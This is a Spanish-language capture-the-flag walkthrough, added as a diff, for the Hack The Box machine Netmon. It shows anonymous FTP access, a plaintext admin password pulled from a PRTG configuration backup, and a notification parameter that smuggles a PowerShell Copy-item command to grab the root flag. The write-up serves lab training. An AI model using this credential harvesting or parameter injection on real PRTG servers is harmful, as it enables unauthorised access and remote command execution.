@@ -1,0 +1,56 @@
+Primero debemos Enumerar
+nmap -sC -sV -o scan_netmon.txt 10.10.10.152
+
+Veremos puertos habiertos como 80,21 donde nos en focaremos primero en el FTP.
+
+# ftp 10.10.10.152
+user: anonymous
+pass: anonymous
+
+Ahora solo debemos enumerar 
+# cd Users\Public
+veremos nuestra primera flag user.txt la cual debemos descargar 
+get user.txt.
+
+Ahora para encontrar la flag del root, debemos probar el puerto 80
+
+http://10.10.10.152
+
+debemos seguir enumerando para buscar el usuario para loguearno al navegador.
+
+otra vez utilizaremos el ftp y debemos ir a la siguiente ruta
+
+
+cd /programdata
+cd Paessler\PRTG Network Monitor” 
+aqui debemos descargar lo siguiente archivo.
+
+# get PRTG Configuration.dat
+aqui abriremos el archivo y buscaremos lo siguiente:
+<!– User: prtgadmin –> PrTg@dmin2018.” Bingo!
+
+luego solo debemos probar el users/pass
+####
+I tried this password with user prtgadmin on the PRTG login page but it didn’t work. Then I realized that this is from a 2018 backup, maybe the admin is lazy and re-used the dbpassword for the admin account and simply used the current date (2019).
+####
+
+Ahora existen varios metodos para extrer la root, como sabemos que HTB siempre pone la flag en "C:\Users\Administrator\Desktop\root.txt"
+
+Haremos lo siguiente para extraer dicho archivo.
+1. Click “Setup.”
+2. Click “Notifications” in “Account Settings.”
+3. Click “Add new notification.”
+4. Habilitar “Execute Program.”
+5. Select “Demo exe notification - outfile.ps1” as the “Program File.”
+6. Enter test.txt; Copy-item "C:/Users/Administrator/Desktop/root.txt" -Destination "C:/Users/Public/root.txt" as the “Parameter.”
+7. Then, switch “Notification Summarization” to “Always notify ASAP, never summarize.”
+8. “Save” the notification.
+9. Click “Send test notification.”
+
+ahora solo debemos volver por el ftp he ir a la siguiente ruta
+
+cd Users\Public 
+
+aqui encontraremos el archivo root.txt 
+
+Done!!!
